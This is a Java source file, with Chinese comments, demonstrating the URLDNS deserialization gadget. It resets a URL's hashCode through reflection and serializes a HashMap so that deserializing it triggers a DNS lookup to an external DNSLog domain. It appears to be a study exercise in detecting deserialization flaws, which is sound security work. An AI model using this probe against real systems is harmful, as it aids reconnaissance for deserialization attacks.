import java.io.*;
import java.net.URL;
import java.util.HashMap;
import java.lang.reflect.Field;

public class URLDNSDebugger {
    public static void main(String[] args) throws Exception {
        
        String domain = "http://9e269028de.ddns.1433.eu.org";
        
        HashMap<URL, String> map = new HashMap<>();
        URL url = new URL(domain);
        map.put(url, "test");
        
        // 🔥 关键！反射重置 hashCode
        Field field = URL.class.getDeclaredField("hashCode");
        field.setAccessible(true);
        field.set(url, -1);  // 重置为 -1，反序列化时会重新计算
        
        // 序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(map);
        oos.close();
    
        // 反序列化（现在会触发 DNS）
        System.out.println("开始反序列化...");
        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();  // ← 这里会触发 DNS
        ois.close();
        
        System.out.println("反序列化完成，检查 DNSLog 平台");
    }
}